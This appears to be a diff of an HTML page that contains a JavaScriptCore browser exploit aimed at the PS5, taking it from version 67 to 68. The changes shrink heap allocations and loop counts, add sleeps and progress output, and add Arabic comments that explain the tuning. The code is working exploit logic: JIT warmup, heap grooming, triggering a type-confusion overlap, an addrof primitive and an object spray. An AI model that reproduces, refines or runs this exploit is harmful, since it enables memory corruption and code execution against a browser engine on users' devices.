@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 JSC v67</title>
+<title>PS5 JSC v68</title>
 <style>
 body{background:#0a0a0a;color:#00ff41;font-family:monospace;padding:20px}
 pre{white-space:pre-wrap;word-wrap:break-word}
@@ -15,11 +15,12 @@ var o=document.getElementById("o");
 function p(m){o.textContent+=m+"\n"}
 function sleep(ms){return new Promise(r=>setTimeout(r,ms))}
 
-p("=== PS5 JSC Exploit v67 (Async) ===\n");
+p("=== PS5 JSC Exploit v68 (Optimized) ===\n");
 
 (async function(){
 try{
-var arr=new Array(0x40_0000).fill(1.1);
+// تقليل حجم المصفوفة الرئيسية لتناسب ذاكرة PS5
+var arr=new Array(0x100000).fill(1.1);
 var ai=arr.length-1;
 var rc=[];
 
@@ -28,14 +29,16 @@ var A={p0:0x41414141,p1:1.1,p2:2.2};
 arr[ai]=A;
 var gc=[];
 var a=new Date(1111);a[0]=1.1;
-for(var j=0;j<n;++j){gc.push(new ArrayBuffer(0x80_0000))}
+// تقليل حجم الـ ArrayBuffer إلى 1 ميجابايت بدلاً من 8
+for(var j=0;j<n;++j){gc.push(new ArrayBuffer(0x100000))}
 A.p2=gc;
 var b={p0:0x42424242,p1:1.1};
 var v=1.1;
 if(f){v=1.1}else{v=b}
 A.p1=v;
 var w=1.1;
-for(var i=0;i<1e6;++i){for(var j=0;j<k;++j){w=i;w=j}}
+// تقليل عدد التكرارات لمنع تجميد المتصفح
+for(var i=0;i<100000;++i){for(var j=0;j<k;++j){w=i;w=j}}
 b.p0=w;b.p1=a;
 }
 
@@ -43,25 +46,25 @@ function rec(n){if(n===0)return;n=n|0;rec(n-1)}
 
 p("[*] Warmup Phase 1...");
 foo(true,1,1);
-await sleep(0);
+await sleep(50);
 foo(false,1,1);
-await sleep(0);
-p("[*] Warmup Phase 2 (1000 calls)...");
-for(var i=0;i<1000;++i){foo(false,0,0);if(i%100===0)await sleep(0)}
+await sleep(50);
+p("[*] Warmup Phase 2 (500 calls)...");
+for(var i=0;i<500;++i){foo(false,0,0);if(i%50===0){await sleep(0);p("  warmup "+i+"/500")}}
 p("[+] Warmup done");
 
 p("[*] Stack manipulation...");
-for(var i=0;i<10000;i++){rec(i);if(i%1000===0)await sleep(0)}
+for(var i=0;i<2000;i++){rec(i);if(i%500===0)await sleep(0)}
 p("[+] Stack done");
 
 p("[*] Triggering overlap...");
 var win=false;
 var ba,ua;
 
-for(var k=0;k<10000&&!win;++k){
-foo(false,10,k%5+1);
-rec(10000);
-await sleep(0); // Yield to browser to prevent crash
+for(var k=0;k<2000&&!win;++k){
+foo(false,5,k%3+1);
+rec(500);
+await sleep(0); // Yield to browser to prevent OOM kill
 
 for(var i=0;i<3;++i)new ArrayBuffer(0x4000);
 var fd=arr[ai].p1.p1;
@@ -71,10 +74,10 @@ var a2=[13.37,2.2,3.3,4.4,nc];
 rc.push(a2);
 if(fd[0]===13.37){win=true;ba=rc[rc.length-1];ba[0]={};ua=fd;break}
 }
-if(k%1000===0)p("  Attempt "+k+"...");
+if(k%100===0)p("  Attempt "+k+"/2000...");
 }
 
-if(!win){p("[-] No overlap");throw 0}
+if(!win){p("[-] No overlap after 2000 attempts");throw 0}
 
 p("[+] OVERLAP FOUND!");
 
@@ -93,7 +96,7 @@ p("[+] addrof(t) = 0x"+ta.toString(16));
 
 p("[*] Spraying for adjacent pair...");
 var sp=[];
-for(var i=0;i<500;++i)sp.push({p1:1.1,p2:2.2});
+for(var i=0;i<200;++i)sp.push({p1:1.1,p2:2.2});
 
 var oA=null,oAa=0n;
 for(var i=1;i<sp.length;++i){
